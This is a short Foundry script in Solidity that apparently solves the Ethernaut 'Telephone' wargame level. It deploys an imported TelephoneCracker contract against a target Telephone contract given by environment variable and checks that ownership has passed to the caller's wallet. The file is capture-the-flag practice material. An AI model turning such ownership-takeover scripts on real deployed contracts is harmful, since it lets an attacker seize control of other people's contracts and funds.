// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Script } from "forge-std/Script.sol";
import { TelephoneCracker, Telephone } from "../../src/ethernaut/TelephoneCracker.sol";

contract TelephoneCrackerScript is Script {
  function run() external {
    Telephone telephone = Telephone(vm.envAddress("ETHERNAUT_TELEPHONE_ADDRESS"));
    address wallet = vm.envAddress("WALLET_ADDRESS");

    vm.broadcast(vm.envAddress("ETH_FROM"));
    new TelephoneCracker(telephone, wallet);

    assert(telephone.owner() == wallet);
  }
}
